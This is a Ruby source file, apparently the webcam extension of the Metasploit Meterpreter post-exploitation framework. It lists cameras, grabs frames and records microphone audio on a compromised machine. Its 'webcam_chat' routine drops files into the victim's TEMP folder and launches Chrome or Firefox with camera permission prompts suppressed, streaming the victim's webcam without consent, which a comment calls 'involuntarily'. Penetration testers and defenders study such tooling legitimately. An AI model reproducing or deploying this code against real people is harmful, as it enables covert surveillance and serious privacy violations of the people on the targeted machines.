# -*- coding: binary -*-

#require 'rex/post/meterpreter/extensions/process'

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Webcam

###
#
# This meterpreter extension can list and capture from webcams and/or microphone
#
###
class Webcam

  include Msf::Post::Common
  include Msf::Post::File

  def initialize(client)
    @client = client
  end

  def session
    @client
  end

  def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs( TLV_TYPE_WEBCAM_NAME ).each{ |tlv|
      names << tlv.value
    }
    names
  end

  # Starts recording video from video source of index +cam+
  def webcam_start(cam)
    request = Packet.create_request('webcam_start')
    request.add_tlv(TLV_TYPE_WEBCAM_INTERFACE_ID, cam)
    client.send_request(request)
    true
  end

  def webcam_get_frame(quality)
    request = Packet.create_request('webcam_get_frame')
    request.add_tlv(TLV_TYPE_WEBCAM_QUALITY, quality)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_WEBCAM_IMAGE ).value
  end

  def webcam_stop
    client.send_request( Packet.create_request( 'webcam_stop' )  )
    true
  end

  #
  # Starts a webcam session with a remote user via WebRTC
  #
  # @param server [String] A server to use for the channel.
  # @return void
  #
  def webcam_chat(server)
    offerer_id = Rex::Text.rand_text_alphanumeric(10)
    channel    = Rex::Text.rand_text_alphanumeric(20)

    remote_browser_path = get_webrtc_browser_path

    if remote_browser_path.blank?
      raise RuntimeError, "Unable to find a suitable browser on the target machine"
    end

    ready_status = init_video_chat(remote_browser_path, server, channel, offerer_id)
    connect_video_chat(server, channel, offerer_id)
  end

  # Record from default audio source for +duration+ seconds;
  # returns a low-quality wav file
  def record_mic(duration)
    request = Packet.create_request('webcam_audio_record')
    request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_AUDIO_DATA ).value
  end

  attr_accessor :client


  private


  #
  # Returns a browser path that supports WebRTC
  #
  # @return [String]
  #
  def get_webrtc_browser_path
    found_browser_path = ''

    case client.platform
    when /win/
      paths = [
        "Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "Program Files\\Mozilla Firefox\\firefox.exe"
      ]

      drive = session.sys.config.getenv("SYSTEMDRIVE")
      paths = paths.map { |p| "#{drive}\\#{p}" }

      # Old chrome path
      user_profile = client.sys.config.getenv("USERPROFILE")
      paths << "#{user_profile}\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe"

      paths.each do |browser_path|
        if file?(browser_path)
          found_browser_path = browser_path
          break
        end
      end

    when /osx|bsd/
      [
        '/Applications/Google Chrome.app',
        '/Applications/Firefox.app',
      ].each do |browser_path|
        if file?(browser_path)
          found_browser_path = browser_path
          break
        end
      end
    when /linux|unix/
      # Need to add support for Linux in the future.
      # But you see, the Linux meterpreter is so broken there is no point
      # to do it now. You can't test anyway.
    end

    found_browser_path
  end


  #
  # Creates a video chat session as an offerer... involuntarily :-p
  # Windows targets only.
  #
  # @param remote_browser_path [String] A browser path that supports WebRTC on the target machine
  # @param offerer_id [String] A ID that the answerer can look for and join
  #
  def init_video_chat(remote_browser_path, server, channel, offerer_id)
    interface = load_interface('offerer.html')
    api       = load_api_code

    interface = interface.gsub(/\=SERVER\=/, server)
    interface = interface.gsub(/\=CHANNEL\=/, channel)
    interface = interface.gsub(/\=OFFERERID\=/, offerer_id)

    tmp_dir = session.sys.config.getenv("TEMP")

    begin
      write_file("#{tmp_dir}\\interface.html", interface)
      write_file("#{tmp_dir}\\api.js", api)
    rescue ::Exception => e
      elog("webcam_chat failed. #{e.class} #{e.to_s}")
      raise RuntimeError, "Unable to initialize the interface on the target machine"
    end

    #
    # Automatically allow the webcam to run on the target machine
    #
    args = ''
    if remote_browser_path =~ /Chrome/
      args = "--allow-file-access-from-files --use-fake-ui-for-media-stream"
    elsif remote_browser_path =~ /Firefox/
      profile_name = Rex::Text.rand_text_alpha(8)
      o = cmd_exec("#{remote_browser_path} --CreateProfile #{profile_name} #{tmp_dir}\\#{profile_name}")
      profile_path = (o.scan(/created profile '.+' at '(.+)'/).flatten[0] || '').strip
      setting = %Q|user_pref("media.navigator.permission.disabled", true);|
      begin
        write_file(profile_path, setting)
      rescue ::Exception => e
        elog("webcam_chat failed: #{e.class} #{e.to_s}")
        raise RuntimeError, "Unable to write the necessary setting for Firefox."
      end
      args = "-p #{profile_name}"
    end

    exec_opts = {'Hidden' => false, 'Channelized' => false}

    begin
      session.sys.process.execute(remote_browser_path, "#{args} #{tmp_dir}\\interface.html", exec_opts)
    rescue ::Exception => e
      elog("webcam_chat failed. #{e.class} #{e.to_s}")
      raise RuntimeError, "Unable to start the remote browser: #{e.message}"
    end
  end


  #
  # Connects to a video chat session as an answerer
  #
  # @param offerer_id [String] The offerer's ID in order to join the video chat
  # @return void
  #
  def connect_video_chat(server, channel, offerer_id)
    interface = load_interface('answerer.html')
    api       = load_api_code

    tmp_api = Tempfile.new('api.js')
    tmp_api.binmode
    tmp_api.write(api)
    tmp_api.close

    interface = interface.gsub(/\=SERVER\=/, server)
    interface = interface.gsub(/\=WEBRTCAPIJS\=/, tmp_api.path)
    interface = interface.gsub(/\=RHOST\=/, rhost)
    interface = interface.gsub(/\=CHANNEL\=/, channel)
    interface = interface.gsub(/\=OFFERERID\=/, offerer_id)

    tmp_interface = Tempfile.new('answerer.html')
    tmp_interface.binmode
    tmp_interface.write(interface)
    tmp_interface.close

    found_local_browser = Rex::Compat.open_webrtc_browser(tmp_interface.path)
    unless found_local_browser
      raise RuntimeError, "Unable to find a suitable browser to connect to the target"
    end
  end


  #
  # Returns the webcam interface
  #
  # @param html_name [String] The filename of the HTML interface (offerer.html or answerer.html)
  # @return [String] The HTML interface code
  #
  def load_interface(html_name)
    interface_path = ::File.join(Msf::Config.data_directory, 'webcam', html_name)
    interface_code = ''
    ::File.open(interface_path) { |f| interface_code = f.read }
    interface_code
  end


  #
  # Returns the webcam API
  #
  # @return [String] The WebRTC lib code
  #
  def load_api_code
    js_api_path = ::File.join(Msf::Config.data_directory, 'webcam', 'api.js')
    api = ''
    ::File.open(js_api_path) { |f| api = f.read }
    api
  end

end

end; end; end; end; end; end
